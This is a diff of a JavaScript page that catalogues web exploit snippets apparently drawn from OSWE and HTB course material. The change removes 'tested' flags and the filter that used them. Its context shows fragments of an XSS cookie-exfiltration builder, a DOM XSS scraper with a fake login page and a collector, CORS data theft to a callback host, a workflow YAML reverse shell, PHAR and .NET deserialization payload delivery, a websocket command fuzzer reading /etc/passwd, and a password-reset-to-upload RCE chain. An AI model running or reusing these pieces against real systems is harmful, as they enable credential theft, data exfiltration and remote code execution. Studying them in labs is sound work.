     code:String.raw`def websocket_task_trigger():
     import uuid
     import websocket  # pip install websocket-client
@@ -3582,7 +3500,6 @@ public class JdbcSqlRunner {
     editFirst:["CANDIDATES","BUILD_DATA","BLOCK_MARKERS"],
     dependsOn:["websocket-task-trigger"],
     sourceRefs:["module 7 scripts","PDF module"],
-    tested:false,
     code:String.raw`def fuzz_websocket_commands(send_func):
     CANDIDATES = ["id", "whoami", "ls", "pwd", "cat /etc/passwd"]  # EDIT
     BLOCK_MARKERS = ["forbidden", "not allowed", "blocked", "permission"]  # EDIT
@@ -3613,7 +3530,6 @@ public class JdbcSqlRunner {
     editFirst:["WS_PATH_OR_URL","KEY","TASK","INJECTION_TEMPLATE","EXPECT"],
     dependsOn:[],
     sourceRefs:["module 7 scripts","PDF module"],
-    tested:false,
     code:String.raw`def run_cmd(cmd):
     import shlex
     import uuid
@@ -3660,7 +3576,6 @@ public class JdbcSqlRunner {
     editFirst:["STORE_PATH","TRIGGER_PATH","FIELD","PAYLOAD","SUCCESS_MARKER"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def second_order_trigger():
     STORE_PATH = "/profile"       # EDIT
     TRIGGER_PATH = "/admin/view"  # EDIT
@@ -3688,7 +3603,6 @@ public class JdbcSqlRunner {
     editFirst:["METHOD","PATH","BODY","THREADS","SUCCESS_MARKER"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def race_burst():
     import concurrent.futures
 
@@ -3720,7 +3634,6 @@ public class JdbcSqlRunner {
     editFirst:["ENDPOINT","FIELD","VALUE","SUCCESS_MARKER"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def logic_negative_amount():
     ENDPOINT = "/checkout"     # EDIT
     FIELD = "amount"           # EDIT
@@ -3746,7 +3659,6 @@ public class JdbcSqlRunner {
     editFirst:["CHAIN","FUNCTION","COMMAND","OUTPUT_MODE","PHAR_FILE"],
     dependsOn:[],
     sourceRefs:["HTB Senior Web module 11"],
-    tested:false,
     code:String.raw`def phpggc_phar_payload_commands():
     import shlex
 
@@ -3787,7 +3699,6 @@ public class JdbcSqlRunner {
     editFirst:["UPLOAD_PATH","TRIGGER_PATH","FIELD","PHAR_PATH","TRIGGER_PARAM"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def trigger_phar_deserialization():
     UPLOAD_PATH = "/upload"                  # EDIT
     TRIGGER_PATH = "/avatar"                 # EDIT
@@ -3817,7 +3728,6 @@ public class JdbcSqlRunner {
     editFirst:["ENDPOINT","FIELD","PAYLOAD_FILE","ENCODING"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def deliver_dotnet_deser_payload():
     ENDPOINT = "/vulnerable"        # EDIT
     FIELD = "data"                  # EDIT
@@ -3848,7 +3758,6 @@ public class JdbcSqlRunner {
     editFirst:["--lhost","--lport"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def build_xss_cookie_exfil():
     CALLBACK_URL = callback_url("x")  # from --lhost/--lport
     close_script = "</" + "script>"
@@ -3873,7 +3782,6 @@ public class JdbcSqlRunner {
     editFirst:["SCRAPE_PATHS","COLLECTOR_BASE","FAKE_LOGIN_HTML"],
     dependsOn:[],
     sourceRefs:["module 7 scripts","PDF module"],
-    tested:false,
     code:String.raw`def build_dom_xss_scraper_js():
     SCRAPE_PATHS = ["/", "/profile", "/admin"]  # EDIT same-origin pages to iframe/fetch
     COLLECTOR_BASE = callback_url("").rstrip("/")  # EDIT if serving elsewhere
@@ -3924,7 +3832,6 @@ public class JdbcSqlRunner {
     editFirst:["XSS_PATH","PARAM","SCRIPT_URL"],
     dependsOn:["xss-dom-scraper-client"],
     sourceRefs:["module 7 scripts","PDF module"],
-    tested:false,
     code:String.raw`def build_dom_xss_url():
     XSS_PATH = "/vulnerable.html"       # EDIT vulnerable page/path
     PARAM = "q"                         # EDIT vulnerable parameter
@@ -3951,7 +3858,6 @@ public class JdbcSqlRunner {
     editFirst:["CLIENT_JS_FILE","OUT_DIR","CERT_FILE","KEY_FILE","--lport"],
     dependsOn:[],
     sourceRefs:["module 7 scripts","PDF module"],
-    tested:false,
     code:String.raw`def start_xss_scrape_collector(host="0.0.0.0", port=None):
     import pathlib
     import ssl
@@ -4011,7 +3917,6 @@ public class JdbcSqlRunner {
     editFirst:["TARGET_PATH_OR_URL","--lhost","--lport"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def build_cors_fetch_payload():
     TARGET_PATH_OR_URL = "/api/me"                # EDIT
     TARGET_URL = TARGET_PATH_OR_URL if TARGET_PATH_OR_URL.startswith("http") else url(TARGET_PATH_OR_URL)
@@ -4039,7 +3944,6 @@ public class JdbcSqlRunner {
     editFirst:[],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def b64url_json(obj):
     raw = json.dumps(obj, separators=(",", ":")).encode()
     return base64.urlsafe_b64encode(raw).decode().rstrip("=")
@@ -4068,7 +3972,6 @@ def hexlify(s):
     editFirst:["--debug"],
     dependsOn:[],
     sourceRefs:["rizemon/exploit-writing-for-oswe"],
-    tested:false,
     code:String.raw`def debug_response(r, limit=800):
     if not DEBUG:
         return r
@@ -4090,7 +3993,6 @@ def hexlify(s):
     editFirst:[],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def extract_one(pattern, text, name="value", flags=0):
     m = re.search(pattern, text, flags)
     check(m, f"{name} not found")
@@ -4109,7 +4011,6 @@ def hexlify(s):
     editFirst:["INPUT_PATH","PATTERNS"],
     dependsOn:[],
     sourceRefs:["module 7 scripts","PDF module"],
-    tested:false,
     code:String.raw`def extract_appdata_values():
     import pathlib
 
@@ -4148,7 +4049,6 @@ def hexlify(s):
     editFirst:["OUT_DIR"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def save_output(name, data):
     import pathlib
 
@@ -4175,7 +4075,6 @@ def hexlify(s):
     editFirst:[],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def dump_session_state():
     print("[cookies]", s.cookies.get_dict())
     print("[headers]", dict(s.headers))
@@ -4194,7 +4093,6 @@ def hexlify(s):
     editFirst:["TRIES","DELAY"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def request_retry(method, path, **kwargs):
     TRIES = 3   # EDIT
     DELAY = 1   # EDIT
@@ -4222,7 +4120,6 @@ def hexlify(s):
     editFirst:["ACTION","TABLE","COLUMN"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def sql_action_query(action="CURRENT_DB"):
     TABLE = "users"       # EDIT
     COLUMN = "password"   # EDIT
@@ -4249,7 +4146,6 @@ def hexlify(s):
     editFirst:["TARGET","LOGIN_PATH","INJECT_PATH","TRUE_MARKER","QUERY"],
     dependsOn:[],
     sourceRefs:["v4 example"],
-    tested:false,
     code:String.raw`def example_login_sqli_proof():
     # Copy the real pieces separately; this example shows order only.
     login_form_csrf()        # EDIT from Form CSRF piece
@@ -4270,7 +4166,6 @@ def hexlify(s):
     editFirst:["RESET_PATHS","LOGIN_PATH","UPLOAD_PATH","SHELL_URL"],
     dependsOn:[],
     sourceRefs:["v4 example"],
-    tested:false,
     code:String.raw`def example_reset_upload_rce():
     reset_token_takeover()   # EDIT token source and reset fields
     login_form_csrf()        # EDIT admin credentials after reset
@@ -4292,7 +4187,6 @@ def hexlify(s):
     editFirst:["CONFIG_PATH","TOKEN_REGEX","LOGIN_PATH"],
     dependsOn:["helper-regex-extract"],
     sourceRefs:["v4 example"],
-    tested:false,
     code:String.raw`def example_file_read_config():
     config = read_file_traversal()  # EDIT target config path
     token = extract_one(r"SECRET_KEY=(.+)", config, "secret key")  # EDIT regex
@@ -4314,7 +4208,6 @@ def hexlify(s):
     editFirst:["--lhost","--lport"],
     dependsOn:[],
     sourceRefs:["v4 example"],
-    tested:false,
     code:String.raw`def example_oob_proof():
     # EDIT run with --lhost/--lport and start listener on --lport first.
     ssrf_oob_probe()
@@ -4335,7 +4228,6 @@ def hexlify(s):
     editFirst:["CORS_PATHS","TEST_ORIGINS","METHODS"],
     dependsOn:[],
     sourceRefs:["OSWE module 9.2"],
-    tested:false,
     code:String.raw`def cors_misconfig_scan():
     CORS_PATHS = ["/api/me", "/api/v1/profile"]      # EDIT endpoints to probe
     TEST_ORIGINS = [                                  # EDIT attacker/null/etc
@@ -4387,7 +4279,6 @@ def hexlify(s):
     editFirst:["ACTION","FIELD","FILENAME","MIME","BODY"],
     dependsOn:[],
     sourceRefs:["OSWE module 9.2"],
-    tested:false,
     code:String.raw`def build_csrf_multipart_html():
     ACTION = url("/api/v1/process")           # EDIT target endpoint
     FIELD = "concord.yml"                     # EDIT form field name
@@ -4418,7 +4309,6 @@ def hexlify(s):
     editFirst:["PATH","ORIGIN","METHOD","CONTENT_TYPE","COOKIE_HEADER"],
     dependsOn:[],
     sourceRefs:["OSWE module 9.2"],
-    tested:false,
     code:String.raw`def cors_samesite_preflight_check():
     PATH = "/api/me"                              # EDIT endpoint
     ORIGIN = "http://attacker.example"            # EDIT origin your HTML is served from
@@ -4474,7 +4364,6 @@ def hexlify(s):
     editFirst:["FETCH_URL","CALLBACK","CHUNK_SIZE","METHOD","BODY"],
     dependsOn:[],
     sourceRefs:["OSWE module 9.2"],
-    tested:false,
     code:String.raw`def build_cors_fetch_exfil_html():
     FETCH_URL = url("/api/service/console/whoami")  # EDIT target API
     CALLBACK = callback_url("callback")             # EDIT uses --lhost/--lport
@@ -4514,7 +4403,6 @@ def hexlify(s):
     editFirst:["--lhost","--lport","DEPENDENCY","SHELL"],
     dependsOn:[],
     sourceRefs:["OSWE module 9.2"],
-    tested:false,
     code:String.raw`def build_workflow_yaml_revshell():
     require_callback()
     DEPENDENCY = "mvn://org.codehaus.groovy:groovy-all:pom:2.5.8"  # EDIT runtime dependency
@@ -4561,7 +4449,6 @@ flows:
     editFirst:["PROCESS_PATH","FIELD","FILENAME","AUTH_HEADER","YAML_BODY"],
     dependsOn:["helper-workflow-yaml-revshell"],
     sourceRefs:["OSWE module 9.3"],
-    tested:false,
     code:String.raw`def workflow_api_upload_rce():
     PROCESS_PATH = "/api/v1/process"        # EDIT workflow/process creation endpoint
     FIELD = "concord.yml"                   # EDIT multipart field name
@@ -4595,7 +4482,6 @@ flows:
     editFirst:["LOGIN_PATH","API_KEY","HEADER_NAME"],
     dependsOn:[],
     sourceRefs:["OSWE module 9.3"],
-    tested:false,
     code:String.raw`def api_key_login_url_helper():
     LOGIN_PATH = "/login?useApiKey=true"     # EDIT
     API_KEY = "PASTE_LEAKED_PLAINTEXT_KEY"   # EDIT from migration/source review
@@ -4617,7 +4503,6 @@ flows:
     editFirst:["BASE","WHO","USER","KEY","PROC","NEW_USER","NEW_PASS","AUTH_KEY","BODY","--lhost","--lport"],
     dependsOn:[],
     sourceRefs:["OSWE module 9.2 Extra Mile"],
-    tested:false,
     code:String.raw`def build_cors_chain_html():
     BASE = TARGET                              # EDIT or override
     CALLBACK = callback_url("loot")            # uses --lhost/--lport
@@ -4679,7 +4564,6 @@ flows:
     editFirst:["ROOT","PATTERNS","EXTS"],
     dependsOn:[],
     sourceRefs:["OSWE module 9.3"],
-    tested:false,
     code:String.raw`def grep_migration_secrets():
     import pathlib
     ROOT = "."                                                    # EDIT path to source/migrations checkout
@@ -4720,7 +4604,6 @@ flows:
     editFirst:[],
     dependsOn:[],
     sourceRefs:["OSWE module 9.3.2"],
-    tested:false,
     code:String.raw`def verify_apikey_hash(plaintext, stored_b64=None):
     # Concord pattern: stored = b64(SHA256(b64decode(plaintext))).rstrip("=")
     # Many JVM apps follow this exact scheme. Pass stored_b64 to compare, omit to just print the hash.
@@ -4749,7 +4632,6 @@ flows:
     editFirst:["CHECK_PATH","CANDIDATES","HEADER_NAME","HEADER_PREFIX"],
     dependsOn:[],
     sourceRefs:["OSWE module 9.3"],
-    tested:false,
     code:String.raw`def auth_default_apikey():
     CHECK_PATH = "/api/service/console/whoami"       # EDIT endpoint that returns 200 when key valid
     CANDIDATES = [                                    # EDIT add keys from migrations/source review
@@ -4782,7 +4664,6 @@ flows:
     editFirst:["loot/index.html","--lhost","--lport"],
     dependsOn:["cors-misconfig-scan","auth-default-apikey","cors-chain-admin-rce-html"],
     sourceRefs:["OSWE module 9"],
-    tested:false,
     code:String.raw`def example_cors_csrf_rce():
     import os                                          # EDIT path of served loot dir
     cors_misconfig_scan()                              # EDIT endpoints first
@@ -4801,7 +4682,6 @@ flows:
 
 var activeId = "base-main";
 var selectedCategory = "All";
-var testedFilter = "all";
 var query = "";
 var chain = [];
 var helpers = new Set();
@@ -4835,8 +4715,6 @@ function searchText(p){
 function filteredPieces(){
   return PIECES.filter(function(p){
     if (selectedCategory !== "All" && p.category !== selectedCategory) return false;
-    if (testedFilter === "tested" && !p.tested) return false;
-    if (testedFilter === "untested" && p.tested) return false;
     if (query && searchText(p).indexOf(norm(query)) === -1) return false;
     return true;
   });
@@ -4864,13 +4742,12 @@ function renderList(){
   var rows = filteredPieces();
   $("#result-count").textContent = rows.length + " pecas";
   $("#piece-list").innerHTML = rows.map(function(p){
-    var cls = p.tested ? "badge good" : "badge warn";
     return '<button class="piece-row" data-id="' + escHtml(p.id) + '" aria-selected="' + String(p.id === activeId) + '">' +
-      '<span class="piece-title">' + escHtml(p.title) + '<span class="' + cls + '">' + (p.tested ? "tested:true" : "tested:false") + '</span></span>' +
+      '<span class="piece-title">' + escHtml(p.title) + '</span>' +
       '<small>' + escHtml(p.category + " / " + p.kind + " / " + p.chainRole) + '</small>' +
       '<small>' + escHtml(p.useWhen) + '</small>' +
       '</button>';
-  }).join("") || '<div class="empty">sem resultados. usa "mostrar tudo" ou limpa search.</div>';
+  }).join("") || '<div class="empty">sem resultados. limpa search ou muda categoria.</div>';
   $("#piece-list").querySelectorAll("button").forEach(function(btn){
     btn.addEventListener("click", function(){
       activeId = btn.dataset.id;
@@ -4882,8 +4759,6 @@ function renderList(){
 
 function renderActive(){
   var p = piece(activeId) || PIECES[0];
-  $("#active-tested").className = p.tested ? "badge good" : "badge warn";
-  $("#active-tested").textContent = p.tested ? "tested:true" : "tested:false";
   var edit = (p.editFirst || []).length ? p.editFirst.join(", ") : "none";
   var deps = (p.dependsOn || []).length ? p.dependsOn.join(", ") : "none";
   $("#active-meta").innerHTML =
@@ -5131,7 +5006,6 @@ function boot(){
   loadState();
   renderPresets();
   $("#search").addEventListener("input", function(ev){ query = ev.target.value; renderList(); });
-  $("#tested-filter").addEventListener("change", function(ev){ testedFilter = ev.target.value; renderList(); });
   $("#apply-preset").addEventListener("click", function(){ applyPreset($("#preset-select").value); });
   $("#view-add-step").addEventListener("click", function(){ addStep(activeId); });
   $("#view-add-helper").addEventListener("click", function(){ addHelper(activeId); });
